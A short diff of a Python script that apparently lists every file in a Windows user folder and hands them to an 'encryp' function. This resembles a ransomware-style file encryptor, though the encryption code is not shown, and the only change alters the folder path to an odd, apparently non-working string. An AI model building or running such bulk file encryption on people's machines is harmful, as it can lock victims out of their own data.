@@ -26,7 +26,7 @@ def encryp(items, key):
 if __name__ == "__main__":
 
 
-    archivos = 'C:\\Users\\Archivos'
+    archivos = 'C:\\Users....\\Archivos'
     items = os.listdir(archivos)
     archivos_2 = [archivos+"\\"+x for x in items]
 
